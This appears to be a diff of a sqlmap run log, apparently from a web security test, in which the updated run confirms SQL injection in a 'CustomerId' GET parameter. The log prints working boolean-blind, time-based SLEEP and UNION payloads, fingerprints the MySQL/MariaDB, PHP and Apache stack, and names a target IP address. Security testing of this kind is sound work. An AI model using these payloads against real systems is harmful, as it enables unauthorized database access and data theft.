@@ -2,19 +2,35 @@
        __H__
  ___ ___[']_____ ___ ___  {1.7.11.2#dev}
 |_ -| . [)]     | .'| . |
-|___|_  [,]_|_|_|__,|  _|
+|___|_  [(]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 20:40:33 /2023-12-10/
+[*] starting @ 00:59:48 /2023-12-14/
 
-[20:40:33] [INFO] parsing HTTP request from './src/request.txt'
-[20:40:33] [INFO] testing connection to the target URL
-[20:40:34] [INFO] checking if the target is protected by some kind of WAF/IPS
-[20:40:35] [INFO] testing if the target URL content is stable
-[20:40:36] [INFO] target URL content is stable
-[20:40:36] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--crawl=2'
+[00:59:48] [INFO] parsing HTTP request from './src/request.txt'
+[00:59:49] [INFO] resuming back-end DBMS 'mysql' 
+[00:59:49] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: CustomerId (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: CustomerId=1 AND 3602=3602
 
-[*] ending @ 20:40:36 /2023-12-10/
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: CustomerId=1 AND (SELECT 2831 FROM (SELECT(SLEEP(5)))Akyg)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: CustomerId=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171787671,0x76646c536467575374417746646b4261426252534e50556550566758744c61424f4b565064616272,0x716b627071),NULL,NULL,NULL-- -
+---
+[00:59:50] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.0.28, Apache 2.4.56
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[00:59:50] [INFO] fetched data logged to text files under '/home/tunc7/.local/share/sqlmap/output/54.254.196.11'
+
+[*] ending @ 00:59:50 /2023-12-14/
 
